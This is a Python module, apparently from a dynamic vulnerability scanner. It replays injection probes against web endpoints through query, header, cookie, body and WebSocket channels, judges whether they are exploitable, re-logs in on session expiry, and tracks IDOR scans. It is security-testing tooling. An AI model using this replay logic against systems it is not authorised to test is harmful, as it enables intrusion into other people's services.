    def _run_family_oracle(self, *, spec: Dict[str, Any], family: str, servlet_name: str,
                           param_name: str, param_location: str, method: str, url: str,
                           timeout: Any, files: Any, content_type: str, primary_value: str,
                           baseline_ms: float, inject: Any, query: Dict[str, Any],
                           headers: Dict[str, Any], cookies: Dict[str, Any],
                           body: Any) -> Optional[Dict[str, Any]]:
        """按族投放行为探测臂，返回 {verdict, slices, body}；不适用时返回 None。

        为什么放在 D1 里而不是 D2：探测臂必须复用**与主重放完全相同**的注入语义
        （query/header/cookie/body + 名注入旁路 + multipart 守卫），否则打的是另一个请求。
        这里只观测与落库，绝不改主判定 —— 是否采信 oracle 由离线复核后另行接线。
        """
        try:
            from src.iast import response_oracle as orc
        except Exception:  # noqa: BLE001
            return None
        if not orc.oracle_enabled():
            return None
        fam = orc.canonical_family(family)
        # stdout 走 WebSocket 帧、不进 HTTP 响应体，普通 cmdi 的 delay 臂永远测不到。
        # 仅当 spec 的 sink / 路由明确指向 WebSocket 时才提升族，普通 cmdi 端点零影响。
        if fam == "command_execution" and self._is_websocket_sink(spec):
            fam = "websocket_cmd"
        if not fam or fam not in orc.oracle_families_from_env():
            return None

        ploc = str(param_location or "query").lower()
        skip = ""
        if files or ploc == "multipart":
            skip = "multipart_channel_unsupported"
        elif ploc == "path":
            skip = "path_channel_unsupported"
        elif not param_name and not servlet_name and fam != "websocket_cmd":
            # 空参数是这类端点的正常形态，不能按 no_param 把探测臂误杀。
            skip = "no_param"
        if skip:
            return {"verdict": {"family": fam, "verdict": "inconclusive", "signal": "skipped",
                                "confidence": 0.0, "reason": skip, "arms": []},
                    "slices": {"verdict": "inconclusive", "signal": "skipped", "reason": skip},
                    "body": body}

        probe_token = str(spec.get("id") or "") or "probe1"
        probes = orc.build_probes(fam, payload=primary_value, servlet_name=servlet_name,
                                  probe_token=probe_token)
        if not probes:
            return None

        # WebSocket 命令执行走两步专用投递（HTTP 注册端点 → WS 收发回显帧），
        # 与下方 HTTP 主循环完全隔离，避免把 requests.request 的语义污染进来。
        if fam == "websocket_cmd":
            return self._run_websocket_oracle(
                spec=spec, url=url, probes=probes, probe_token=probe_token,
                timeout=timeout, headers=dict(headers), cookies=dict(cookies),
                content_type=content_type, method=method, baseline_ms=baseline_ms,
                body=body)

        q0, h0, c0, b0 = dict(query), dict(headers), dict(cookies), body
        arms: List[Any] = []
        for _idx, p in enumerate(probes):
            arm = None
            _arm_auth_state = ""
            try:
                if p.channel == "name":
                    # `<taint_marker>=<servlet_name>`、`<taint_marker>Z=<servlet_name>` 两组参数，
                    # servlet 取「值 == servlet 名」的**第一个**参数 ⇒ 探测臂排在后面永远选不中
                    # 。
                    # 故名通道先把「值 == servlet_name」的旧参数全部摘掉，只留探测臂这一个。
                    for _k in [k for k, v in list(query.items()) if str(v) == servlet_name]:
                        query.pop(_k, None)
                    query[p.payload] = servlet_name
                    _pn, _pl = p.payload, "query"
                elif p.channel == "header":
                    _hname = p.note.split(":", 1)[1] if ":" in p.note else "Referer"
                    headers[_hname] = p.payload
                    _pn, _pl = _hname, "header"
                else:
                    # 的端点读的是**整个请求体**（QLExpress.vuln1 与 XStreamRce.parseXml
                    # 都用 WebUtils.getRequestBody），把探测臂包成 {"_body": "..."} 的
                    # JSON 对象会让两端恒解析失败，必须走裸串投递。
                    # 另：_replay_attack 的 _inject 用 nonlocal 改的是外层 body，本函数
                    # 的局部 body 不会变 —— 此前所有 body 通道探测臂实际发的都是同一份
                    # 主载荷（oracle 恒 inconclusive 的隐性根因）。这里显式重建。
                    # 与主重放共用同一个纯函数判据（needs_raw_body_payload），避免
                    # 「探测臂发裸串、主请求发 JSON 字典」这种两边不可比的错配（627 fastjson）。
                    if needs_raw_body_payload(fam, param_name, ploc, content_type):
                        body = p.payload
                    else:
                        _nb = inject(param_name, ploc, p.payload)
                        if _nb is not None:
                            body = _nb
                        elif ploc in ("body", "form"):
                            body = dict(body) if isinstance(body, dict) else {}
                            body[param_name] = p.payload
                    _pn, _pl = param_name, ploc
                _t0 = time.time()
                if files:
                    _data, _json = None, None
                else:
                    _data, _json = body_data_json(body, content_type)
                _resp, _arm_auth_state = self._guarded_request(
                    method=method, url=url, params=query or None, headers=headers or None,
                    cookies=cookies, data=_data, json_body=_json, files=files or None,
                    timeout=timeout, allow_redirects=False, baseline_cookies=c0,
                )
                # 守卫已把重登耗时剔除，优先用「最后一次真实 HTTP 往返」的耗时；
                # 异常回退时才用外层 _t0，避免把登录耗时误记成 SLEEP 时延。
                _ms = float(getattr(self, "_guarded_request_ms", 0) or 0) \
                    or (time.time() - _t0) * 1000.0
                _txt = str(getattr(_resp, "text", "") or "")
                arm = orc.ArmResult(arm=p.arm, payload=p.payload,
                                    status=int(getattr(_resp, "status_code", 0) or 0),
                                    body=_txt, elapsed_ms=_ms, note=p.note,
                                    # 正向信号全在响应头里，必须带上，否则 judge 判不出来。
                                    headers=dict(getattr(_resp, "headers", None) or {}))
                # 观察层落库：每次探测臂一行（attempt_no 用 100+ 段位，与主/绕过臂区分）
                try:
                    self._record_replay_attempt(
                        spec=spec, method=method, url=url, param_name=_pn, param_location=_pl,
                        payload=p.payload, encoding="oracle:" + p.arm,
                        content_type=content_type, headers=headers, response=_resp, text=_txt,
                        waf_blocked=self._is_waf_blocked(
                            getattr(_resp, "status_code", 0), _txt,
                            dict(getattr(_resp, "headers", None) or {})),
                        elapsed_ms=int(_ms), attempt_no=100 + _idx,
                        auth_state=_arm_auth_state,
                    )
                except Exception:  # noqa: BLE001
                    pass
            except Exception as exc:  # noqa: BLE001
                arm = orc.ArmResult(arm=p.arm, payload=p.payload, error=str(exc), note=p.note)
            finally:
                query.clear(); query.update(q0)
                headers.clear(); headers.update(h0)
                cookies.clear(); cookies.update(c0)
                body = b0
            if arm is not None:
                arms.append(arm)
                # 短路：已有正向信号就停，省请求（阴性用例才需要跑满阶梯）
                try:
                    if orc.judge(fam, arms, baseline_ms=baseline_ms).get("verdict") == "exploitable":
                        break
                except Exception:  # noqa: BLE001
                    pass

        verdict = orc.judge(fam, arms, baseline_ms=baseline_ms)
        try:
            logger.info("[D1.replay][oracle] %s %s %s",
                        str(spec.get("http_method") or method),
                        str(spec.get("target_endpoint") or url), orc.summarize(verdict))
        except Exception:  # noqa: BLE001
            pass
        # 观测列落库（不参与判定；oracle_state ∈ exploitable/not_exploitable/inconclusive）
        try:
            if self.db is not None and spec.get("id"):
                self.db.execute(
                    "UPDATE trigger_specs SET oracle_state=?, oracle_signal=? WHERE id=?",
                    (str(verdict.get("verdict") or ""), str(verdict.get("signal") or ""),
                     int(spec["id"])))
        except Exception as exc:  # noqa: BLE001
            logger.debug("[D1.replay][oracle] 观测列落库失败（忽略）：%s", exc)
        return {"verdict": verdict,
                "slices": {"verdict": verdict.get("verdict"), "signal": verdict.get("signal"),
                           "reason": verdict.get("reason"), "arms": len(arms)},
                "body": body}


    @staticmethod
    def _is_websocket_sink(spec: Dict[str, Any]) -> bool:
        """spec 是否指向 WebSocket 命令执行端点。

        只看 SAST 侧已知事实：sink 文件名含 websocket，或 target_endpoint 含 /websocket/。
        命中才把 command_execution 提升为 websocket_cmd；普通 cmdi 端点一律不受影响。
        """
        sink = str(spec.get("expected_sink_file") or "").replace("\\", "/").lower()
        ep = str(spec.get("target_endpoint") or "").lower()
        return "websocket" in sink.rsplit("/", 1)[-1] or "/websocket/" in ep

    @staticmethod
    def _ws_exchange(uri: str, message: str, timeout: float,
                     cookies: Optional[Dict[str, Any]] = None,
                     headers: Optional[Dict[str, Any]] = None) -> str:
        """同步封装异步 WebSocket 客户端：连上、发一条命令、收一帧回显。

        到 /login，websockets 17.2 跟随重定向后把 http://.../login 当 WS URI 校验，
        抛 `InvalidURI: scheme isn't ws or wss` ⇒ oracle 恒 inconclusive，623/624 的
        websocket_cmd 点即由此漏报。另外本机靶场必须直连：环境里的 HTTP_PROXY 会
        介入握手；proxy=False 在 17.2 会抛 InvalidProxy，只能用 None 关闭。
        """
        import asyncio
        import concurrent.futures
        import inspect
        import websockets

        _hdrs: Dict[str, str] = {}
        try:
            for _k, _v in dict(headers or {}).items():
                if str(_k).lower() in ("cookie", "authorization", "x-xsrf-token",
                                       "x-csrf-token") and _v:
                    _hdrs[str(_k)] = str(_v)
            if cookies and "cookie" not in {str(k).lower() for k in _hdrs}:
                _ck = "; ".join("%s=%s" % (k, v)
                                for k, v in dict(cookies).items() if v)
                if _ck:
                    _hdrs["Cookie"] = _ck
        except Exception:  # noqa: BLE001
            _hdrs = {}
        _kw: Dict[str, Any] = {"open_timeout": timeout, "close_timeout": timeout}
        try:
            _params = inspect.signature(websockets.connect).parameters
            if "proxy" in _params:
                _kw["proxy"] = None
            if _hdrs:
                _hk = "additional_headers" if "additional_headers" in _params else "extra_headers"
                _kw[_hk] = _hdrs
        except Exception:  # noqa: BLE001
            pass

        async def _run() -> str:
            async with websockets.connect(uri, **_kw) as ws:
                await ws.send(message)
                return str(await asyncio.wait_for(ws.recv(), timeout=timeout))

        try:
            asyncio.get_running_loop()
        except RuntimeError:
            return asyncio.run(_run())
        # 极端情况：调用方已在一个 event loop 里，换独立线程跑，避免 asyncio.run 抛错。
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
            return ex.submit(lambda: asyncio.run(_run())).result(timeout=timeout + 2)

    def _run_websocket_oracle(self, *, spec, url, probes, probe_token, timeout,
                              headers, cookies, content_type, method,
                              baseline_ms, body) -> Optional[Dict[str, Any]]:
        """WebSocket 命令执行族两步探测：HTTP 注册端点 → WS 发命令读回显帧。

        全程 fail-safe：注册失败 / 连不上 / 超时 / 未收到帧一律 inconclusive，
        绝不把「没打通」当成「不存在漏洞」，也绝不凭注册成功页造正向结论。
        回显帧写进 replay_attempts.resp_body_head，供 technique_oracle postpass 消费。
        """
        from types import SimpleNamespace
        from urllib.parse import urlparse, urlunparse

        from src.iast import response_oracle as orc

        try:
            _to = float(timeout) if not isinstance(timeout, (tuple, list)) else float(timeout[0])
            _to = max(1.0, min(_to, 10.0))
        except Exception:  # noqa: BLE001
            _to = 5.0
        parsed = urlparse(str(url or ""))
        scheme = "wss" if parsed.scheme == "https" else "ws"
        netloc = parsed.netloc
        reg_url = urlunparse((parsed.scheme, netloc, parsed.path or "/", "", "", ""))
        wp = orc.build_ws_probe(probe_token)
        arms: List[Any] = []
        for _idx, p in enumerate(probes or []):
            _t0 = time.time()
            try:
                reg = requests.get(
                    reg_url, params={wp["register_param"]: wp["ws_path"]},
                    headers=headers or None, cookies=cookies or None,
                    timeout=_to, allow_redirects=False,
                )
                reg_status = int(getattr(reg, "status_code", 0) or 0)
                # 只认 2xx：302/401/403 是登录墙或拦截，不是端点注册成功，
                reg_ok = 200 <= reg_status < 300
                frame = ""
                if reg_ok:
                    ws_uri = urlunparse((scheme, netloc, wp["ws_path"], "", "", ""))
                    frame = self._ws_exchange(ws_uri, wp["command"], _to,
                                             cookies=cookies, headers=headers)
                _ms = (time.time() - _t0) * 1000.0
                arm = orc.ArmResult(
                    arm=p.arm, payload=wp["command"],
                    status=101 if reg_ok else None, body=frame, elapsed_ms=_ms,
                    error="" if reg_ok else "ws_endpoint_not_registered",
                    note="ws_echo:" + wp["ws_path"] + ":" + wp["marker"],
                )
                try:
                    self._record_replay_attempt(
                        spec=spec, method="GET", url=reg_url,
                        param_name=wp["register_param"], param_location="query",
                        payload=wp["command"], encoding="oracle:ws_echo",
                        content_type=content_type, headers=headers,
                        response=SimpleNamespace(status_code=101 if reg_ok else reg_status,
                                                 headers={}),
                        text=frame, waf_blocked=False,
                        elapsed_ms=int(_ms), attempt_no=100 + _idx,
                    )
                except Exception:  # noqa: BLE001
                    pass
            except Exception as exc:  # noqa: BLE001
                arm = orc.ArmResult(arm=p.arm, payload=wp["command"],
                                    error=str(exc), note="ws_echo:" + wp["ws_path"])
            arms.append(arm)
        verdict = orc.judge("websocket_cmd", arms, baseline_ms=baseline_ms)
        try:
            logger.info("[D1.replay][oracle][ws] %s %s %s", method,
                        str(spec.get("target_endpoint") or url), orc.summarize(verdict))
        except Exception:  # noqa: BLE001
            pass
        try:
            if self.db is not None and spec.get("id"):
                self.db.execute(
                    "UPDATE trigger_specs SET oracle_state=?, oracle_signal=? WHERE id=?",
                    (str(verdict.get("verdict") or ""), str(verdict.get("signal") or ""),
                     int(spec["id"])))
        except Exception as exc:  # noqa: BLE001
            logger.debug("[D1.replay][oracle][ws] 观测列落库失败（忽略）：%s", exc)
        return {"verdict": verdict,
                "slices": {"verdict": verdict.get("verdict"), "signal": verdict.get("signal"),
                           "reason": verdict.get("reason"), "arms": len(arms)},
                "body": body}

    def __init__(self, db: Optional[Database] = None, gateway: Any = None):
        if db is None:
            tmp = Path(tempfile.gettempdir()) / f"savr_idor_{int(time.time() * 1000000)}.db"
            db = Database(str(tmp))
        self.db = db
        self.gateway = gateway

    # ------------------------------------------------------------------ LLM 网关注入 #
    #   1) 业务语义复核 _ai_overlay_judgement（purpose=d1-ai-overlay）；
    #   2) SCA 选弹的 LLM 兜底 PayloadForge.forge_from_sca（purpose=payload-forge）。
    # 但历史上**没有任何构造点传 gateway**，于是 self.gateway 恒为 None，两条腿都是死的
    # （静默、不报错；PayloadForge 侧还额外有一个调用签名错误，见 payload_forge 内注释）。
    #
    # 激活方式统一收敛到本 helper，避免在每个构造点各写一份判断（也避免有人漏传）。
    # 默认**关**：_ai_overlay_judgement 的返回值会直接覆盖确定性启发式
    #   （replay_* 内 `confirmed = ai if ai is not None else heuristic`），
    # 也就是说打开它会让 LLM 有机会改写 D1 的 confirmed 判定 → 进而影响 D2 与 findings。
    # 这种「会改变判定结果」的链路不应在未经评审时默认打开。
    # 打开方式：config 里设 agents.d1.enable_llm_overlay: true，或显式传 gateway。
    _LLM_OVERLAY_KEY = "agents.d1.enable_llm_overlay"

    @classmethod
    def build_gateway_from_config(cls, cfg: Optional[Dict[str, Any]] = None) -> Any:
        """按 ``agents.d1.enable_llm_overlay``（默认 False）决定是否给 D1 注入在线网关。

        关时返回 None —— 与接入前的行为完全一致（两条 LLM 腿都不走，走确定性启发式）。
        """
        def _flag(source: Any) -> bool:
            if not isinstance(source, dict):
                return False
            if cls._LLM_OVERLAY_KEY in source:
                return bool(source.get(cls._LLM_OVERLAY_KEY))
            node: Any = source
            for part in cls._LLM_OVERLAY_KEY.split("."):
                if not isinstance(node, dict) or part not in node:
                    return False
                node = node[part]
            return bool(node)

        if not _flag(cfg):
            # 传入的 cfg 没显式表态时，再看根配置（生产构造点通常只传局部投影）
            try:
                from src.core.config import config as _root
                if not _flag(_root.snapshot() or {}):
                    return None
            except Exception:
                return None
        try:
            from src.core.model_gateway import gateway_from_config, resolve_llm_config
            return gateway_from_config(resolve_llm_config(cfg))
        except Exception as exc:  # 网关构造失败不应阻断 D1
            logger.warning("[D1] LLM 网关构造失败，AI 复核与 LLM 造弹将不启用：%s", exc)
            return None

    def create_app(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        now = datetime.utcnow().isoformat()
        app_id = self._safe_id(payload.get("app_id") or payload.get("app_name") or f"app-{int(time.time())}")
        existing = self.db.execute("SELECT created_at FROM dast_apps WHERE app_id = ?", (app_id,), fetchone=True)
        self.db.execute(
            """
            INSERT OR REPLACE INTO dast_apps
            (app_id, app_name, base_url, service_name, auth_type, role_boundaries_json, settings_json, created_at, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                app_id,
                payload.get("app_name", app_id),
                payload.get("base_url", ""),
                payload.get("service_name", ""),
                payload.get("auth_type", "cookie"),
                self.db.dumps(payload.get("role_boundaries") or []),
                self.db.dumps(payload.get("settings") or {}),
                existing["created_at"] if existing else now,
                now,
            ),
        )
        if payload.get("accounts"):
            self.import_accounts(app_id, {"accounts": payload.get("accounts") or []})
        return self.get_app(app_id)

    def get_app(self, app_id: str) -> Dict[str, Any]:
        row = self.db.execute("SELECT * FROM dast_apps WHERE app_id = ?", (app_id,), fetchone=True)
        if not row:
            return self.create_app({"app_id": app_id, "app_name": app_id})
        app = self._app_row(row)
        app["accounts"] = self.list_accounts(app_id)
        app["api_count"] = len(self.list_apis(app_id))
        app["traffic_sample_count"] = len(self.list_traffic(app_id))
        return app

    def list_apps(self) -> List[Dict[str, Any]]:
        rows = self.db.execute("SELECT * FROM dast_apps ORDER BY updated_at DESC", fetchall=True) or []
        return [self._app_row(row) for row in rows]

    def import_accounts(self, app_id: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        self.get_app(app_id)
        now = datetime.utcnow().isoformat()
        for item in payload.get("accounts") or []:
            account_id = str(item.get("account_id") or item.get("username") or item.get("name") or f"account-{time.time()}")
            self.db.execute(
                """
                INSERT OR REPLACE INTO dast_accounts
                (app_id, account_id, role, tenant, subject, auth_headers_json, auth_cookies_json, token_ref, metadata_json, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    app_id,
                    account_id,
                    item.get("role", ""),
                    item.get("tenant", ""),
                    item.get("subject") or item.get("user_id") or account_id,
                    self.db.dumps(item.get("auth_headers") or item.get("headers") or {}),
                    self.db.dumps(item.get("auth_cookies") or item.get("cookies") or {}),
                    item.get("token_ref", ""),
                    self.db.dumps({k: v for k, v in item.items() if k not in {"auth_headers", "headers", "auth_cookies", "cookies"}}),
                    now,
                ),
            )
        return {"app_id": app_id, "imported": len(payload.get("accounts") or []), "accounts": self.list_accounts(app_id)}

    def list_accounts(self, app_id: str) -> List[Dict[str, Any]]:
        rows = self.db.execute("SELECT * FROM dast_accounts WHERE app_id = ? ORDER BY role, account_id", (app_id,), fetchall=True) or []
        return [self._account_row(row) for row in rows]

    def import_apis(self, app_id: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        self.get_app(app_id)
        apis = list(payload.get("apis") or [])
        if payload.get("openapi"):
            apis.extend(self._apis_from_openapi(payload.get("openapi") or {}))
        if payload.get("postman") or payload.get("collection"):
            apis.extend(self._apis_from_postman(payload.get("postman") or payload.get("collection") or {}))
        now = datetime.utcnow().isoformat()
        for item in apis:
            method = str(item.get("method", "GET")).upper()
            path = item.get("path") or item.get("url") or "/"
            api_key = f"{method} {path}"
            fields = item.get("resource_id_fields") or self._infer_resource_fields(path, item)
            self.db.execute(
                """
                INSERT OR REPLACE INTO dast_apis
                (app_id, api_key, method, path, operation_id, description, params_json, body_schema_json, resource_id_fields_json, auth_required, risk_level, tags_json, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    app_id,
                    api_key,
                    method,
                    path,
                    item.get("operation_id") or item.get("operationId") or "",
                    item.get("description", ""),
                    self.db.dumps(item.get("params") or item.get("parameters") or []),
                    self.db.dumps(item.get("body_schema") or item.get("requestBody") or {}),
                    self.db.dumps(fields),
                    1 if item.get("auth_required", True) else 0,
                    item.get("risk_level") or self._risk_level(method, path),
                    self.db.dumps(item.get("tags") or []),
                    now,
                ),
            )
        return {"app_id": app_id, "imported": len(apis), "apis": self.list_apis(app_id)}

    def list_apis(self, app_id: str) -> List[Dict[str, Any]]:
        rows = self.db.execute("SELECT * FROM dast_apis WHERE app_id = ? ORDER BY path, method", (app_id,), fetchall=True) or []
        return [self._api_row(row) for row in rows]

    def import_traffic(self, app_id: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        self.get_app(app_id)
        now = datetime.utcnow().isoformat()
        samples = []
        for index, item in enumerate(payload.get("samples") or []):
            sample = self._normalize_sample(app_id, item, index)
            samples.append(sample)
            self.db.execute(
                """
                INSERT INTO dast_traffic_samples
                (app_id, api_id, sample_key, method, path, role, tenant, subject, resource_owner, resource_tenant, resource_id, request_json, response_json, status_code, response_body, source, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    app_id,
                    sample.get("api_id"),
                    sample.get("sample_key", ""),
                    sample.get("method", "GET"),
                    sample.get("path", "/"),
                    sample.get("role", ""),
                    sample.get("tenant", ""),
                    sample.get("subject", ""),
                    sample.get("resource_owner", ""),
                    sample.get("resource_tenant", ""),
                    sample.get("resource_id", ""),
                    self.db.dumps(sample.get("request") or {}),
                    self.db.dumps(sample.get("response") or {}),
                    int(sample.get("status_code") or 0),
                    sample.get("response_body", ""),
                    sample.get("source", "manual"),
                    now,
                ),
            )
        return {"app_id": app_id, "imported": len(samples), "samples": self.list_traffic(app_id)}

    def list_traffic(self, app_id: str) -> List[Dict[str, Any]]:
        rows = self.db.execute("SELECT * FROM dast_traffic_samples WHERE app_id = ? ORDER BY id", (app_id,), fetchall=True) or []
        return [self._sample_row(row) for row in rows]

    def scan(self, app_id: str, payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        payload = payload or {}
        app = self.get_app(app_id)
        execute_http = bool(payload.get("execute_http", False))
        allow_mutating = bool(payload.get("allow_mutating", False))
        mode = str(payload.get("mode") or "imported_traffic")
        now = datetime.utcnow().isoformat()
        self.db.execute("INSERT INTO dast_scan_runs (app_id, mode, status, summary_json, created_at) VALUES (?, ?, 'running', '{}', ?)", (app_id, mode, now))
        run_id = int((self.db.execute("SELECT id FROM dast_scan_runs ORDER BY id DESC LIMIT 1", fetchone=True))["id"])
        apis = self.list_apis(app_id)
        samples = self.list_traffic(app_id)
        accounts = self.list_accounts(app_id)
        candidates = self._build_candidates(apis, samples, accounts)
        findings: List[Dict[str, Any]] = []
        decisions: List[Dict[str, Any]] = []
        replayed = 0
        for candidate in candidates:
            api = candidate.get("api") or {}
            if self._skip_api(api):
                continue
            if execute_http and (allow_mutating or api.get("method") in {"GET", "HEAD", "OPTIONS"}):
                replayed += 1
                candidate = self._execute_candidate(app, candidate)
            evidence = self._build_evidence(app, candidate)
            decision = self._ai_decision(evidence)
            decisions.append(decision)
            if decision.get("is_idor"):
                finding = self._finding_from_decision(app, api, evidence, decision)
                findings.append(finding)
                self._persist_finding(run_id, app_id, api.get("id"), finding, evidence, decision)
        summary = {
            "candidate_count": len(candidates),
            "replayed_count": replayed,
            "finding_count": len(findings),
            "execute_http": execute_http,
            "mode": mode,
        }
        finished = datetime.utcnow().isoformat()
        self.db.execute(
            """
            UPDATE dast_scan_runs
            SET status = 'completed', candidate_count = ?, replayed_count = ?, finding_count = ?, summary_json = ?, finished_at = ?
            WHERE id = ?
            """,
            (len(candidates), replayed, len(findings), self.db.dumps(summary), finished, run_id),
        )
        return {"app_id": app_id, "run_id": run_id, "finding_count": len(findings), "candidate_count": len(candidates), "replayed_count": replayed, "findings": findings, "decisions": decisions}

    def _ensure_login_config(self, target: Dict[str, Any], spec: Dict[str, Any]) -> None:
        """target 缺登录配置时，从 ``workspaces.settings_json`` 确定性兜底补齐。

        根因不是配置，而是 **D1 有多条调用入口**（benchmark_cli._auto_replay / orchestrator /
        REST /dast/replay），此前只在 _auto_replay 一处做过 login 透传，其余路径漏传即静默失效。

        故把兜底下沉到 replay 这个唯一入口：只补不覆盖，上游已透传时零改动；
        按 workspace_id 做实例级缓存，避免每条 spec 查一次库。任何异常静默忽略，绝不阻断重放。
        """
        if target.get("login") or target.get("auth"):
            return
        if getattr(self, "db", None) is None:
            return
        try:
            ws_id = int(target.get("workspace_id") or spec.get("workspace_id") or 0)
            if not ws_id:
                return
            cache = getattr(self, "_login_cfg_cache", None)
            if cache is None:
                cache = {}
                self._login_cfg_cache = cache
            if ws_id not in cache:
                row = self.db.execute(
                    "SELECT settings_json FROM workspaces WHERE id=?", [ws_id], fetchone=True)
                raw = (row or {}).get("settings_json") if row else None
                if isinstance(raw, str):
                    raw = json.loads(raw or "{}")
                if not isinstance(raw, dict):
                    raw = {}
                cfg = raw.get("login") or raw.get("auth") or {}
                tu = raw.get("target_url") or raw.get("service_url") or raw.get("base_url") or ""
                cache[ws_id] = (cfg if isinstance(cfg, dict) else {}, str(tu or ""))
            cfg, tu = cache[ws_id]
            if cfg:
                target["login"] = cfg
                logger.info("[D1.auth] target 缺 login，已从 workspace.settings_json 兜底补齐（ws=%s）",
                            ws_id)
            # 同时补 base_url：_fallback_auth_cookies 需要它拼登录 URL。
            if tu and not (target.get("service_url") or target.get("base_url")):
                target["service_url"] = tu
        except Exception as exc:  # noqa: BLE001
            logger.debug("[D1.auth] workspace 登录配置兜底失败（忽略）：%s", exc)

    def _auth_guard_enabled(self) -> bool:
        return str(os.environ.get("SAST_AI_D1_AUTH_GUARD", "1")).strip().lower() \
            not in ("0", "false", "off")

    def _auth_guard_relogin(self, cookies: Optional[Dict[str, str]],
                            baseline: Optional[Dict[str, str]] = None) -> bool:
        """会话失效后强制重登，并就地刷新调用方持有的 cookie 字典。

        主重放与 oracle 探测臂共享同一份 cookies dict；oracle 循环还会在 finally 里
        用 c0 恢复基线，所以两处都要同步刷新，否则新会话会被旧值盖回去。
        """
        ctx = getattr(self, "_auth_guard_ctx", None) or {}
        target = ctx.get("target") or {}
        if not (target.get("login") or target.get("auth")):
            return False
        if int(ctx.get("relogin_count") or 0) >= _AUTH_GUARD_MAX_RELOGIN:
            logger.warning("[D1.auth] 本条 spec 重登已达上限 %d，停止自愈", _AUTH_GUARD_MAX_RELOGIN)
            return False
        ctx["relogin_count"] = int(ctx.get("relogin_count") or 0) + 1
        fresh = _fallback_auth_cookies(target, force=True)
        if not fresh:
            return False
        for holder in (cookies, baseline):
            if isinstance(holder, dict):
                holder.clear()
                holder.update(fresh)
        cache = getattr(self, "_tech_session_cache", None)
        if isinstance(cache, dict):
            key = ctx.get("cache_key")
            if key:
                cache.pop(key, None)
                cache[key] = {"auth_cookies": dict(fresh)}
        logger.info("[D1.auth] 检测到登录墙，已重登并刷新会话（cookie=%s）", sorted(fresh))
        return True

    def _guarded_request(self, *, method: str, url: str, params: Any = None,
                         headers: Any = None, cookies: Optional[Dict[str, str]] = None,
                         data: Any = None, json_body: Any = None, files: Any = None,
                         timeout: Any = 10, allow_redirects: bool = False,
                         baseline_cookies: Optional[Dict[str, str]] = None):
        """requests.request 的认证态包装：登录墙 → 重登 → 用新会话重发一次。

        返回 (response, auth_state)，auth_state 取值：
        anonymous / authenticated / expired / reauthed / reauth_failed。
        覆盖范围：主重放 _replay_attack、_send_one、oracle 探测臂、以及会落
        replay_attempts 的 bypass_variant 补投。其余裸 requests.request（baseline /
        抗抖动补投 / 方法回退 / multi_form / snapshot）只做观测、不落 attempts、
        不参与判定，保持原样以免把执行层自愈扩散进取证链路。
        """
        # cookies 必须是可就地刷新的 dict：重登后 _auth_guard_relogin 会 clear/update 它，
        # kw 持有同一个引用，重发才能自动带上新会话。传 None 时归一化为空 dict。
        if not isinstance(cookies, dict):
            cookies = {}
        kw = dict(method=method, url=url, params=params, headers=headers, cookies=cookies,
                  data=data, json=json_body, files=files, timeout=timeout,
                  allow_redirects=allow_redirects)
        self._guarded_request_ms = 0.0
        _t_req = time.time()
        resp = requests.request(**kw)
        # 只记最后一次 HTTP 往返耗时：重登本身可能耗时数秒，若被算进 oracle 的
        # delay 臂 elapsed_ms，会伪造出 sqli_time / time_delay 的假阳性证据。
        self._guarded_request_ms = (time.time() - _t_req) * 1000.0
        state = "authenticated" if cookies else "anonymous"
        if not self._auth_guard_enabled() or not _is_login_wall_response(
                getattr(resp, "status_code", 0), getattr(resp, "headers", None), url):
            return resp, state
        if not self._auth_guard_relogin(cookies, baseline_cookies):
            return resp, "reauth_failed"
        try:
            _t_req = time.time()
            _resp2 = requests.request(**kw)
            self._guarded_request_ms = (time.time() - _t_req) * 1000.0
            return _resp2, "reauthed"
        except Exception as exc:  # noqa: BLE001
            logger.warning("[D1.auth] 重登后重发失败：%s", exc)
            return resp, "reauth_failed"

    def replay(self, trigger_spec: Dict[str, Any], target: Dict[str, Any], session: Any = None, accounts: Any = None) -> "DastImpact":
        """ D1 重放路由：按 category 把假说分发到正确的攻击通道。

        - 业务逻辑族（bola/race/vertical_privesc/...）是身份问题，不是污点问题，
          canary 追踪对它无效 → 走 business_logic.verify 的双账户差分重放。
        - 其余（OWASP 普通漏洞）走「请求头 canary + 参数真实 payload」：
          头里的 canary 供 I1 做请求级关联（payload 变形/绕过都不影响），
          参数位的真实 payload 由 A2 构造（反序列化等需真 gadget 链），D1 只投放。

        编排器只调 replay(spec, target)，路由在内部完成，编排器无需感知 category。
        """
        from src.iast.attack_context import is_business_logic, normalize_category

        spec = dict(trigger_spec or {})
        target = dict(target or {})
        # 这样无论从哪条入口进来，技术族会话通道都能拿到 login（见 _ensure_login_config）。
        self._ensure_login_config(target, spec)
        # per-request 认证守卫上下文：_guarded_request 在 _send_one / oracle 探测臂里
        # 需要拿到 target 与会话缓存键才能重登，故在唯一入口挂一次。
        self._auth_guard_ctx = {
            "target": target,
            "spec": spec,
            "cache_key": (str(target.get("service_url") or ""),
                          str((target.get("login") or {}).get("url") or "")),
            "relogin_count": 0,
        }
        # 所以监听器必须知道「接下来这批请求属于哪个 spec」，不能靠重放前后取差值。
        if str(spec.get("family") or "").lower() in ("jndi_injection", "jndi"):
            try:
                from src.iast import jndi_probe
                jndi_probe.begin_spec(spec.get("id"))
            except Exception:  # noqa: BLE001  探针不可用不影响重放
                pass
        # Q1：D1 重放入口合法性闸门——复用 #3 端点合法性判定（拒源码路径 / 方法名拼接 / 空端点 / 探针路由）。
        # 旧数据里 A2 登记的垃圾 spec（endpoint 形如 OrderService.java:118、空端点、/api/fw/* 探针路由）
        # 若直接重放会向不存在的端点发请求 → 永远 not_hit 且污染命中统计。此处挡掉，返回 blocked 不计入命中。
        from src.core.param_resolver import is_valid_route, _is_probe_route
        _ep = str(spec.get("target_endpoint") or spec.get("route") or "").strip()
        if not _ep or not is_valid_route(_ep) or _is_probe_route(str(spec.get("file", "") or ""), _ep):
            from src.iast.orchestrator import DastImpact
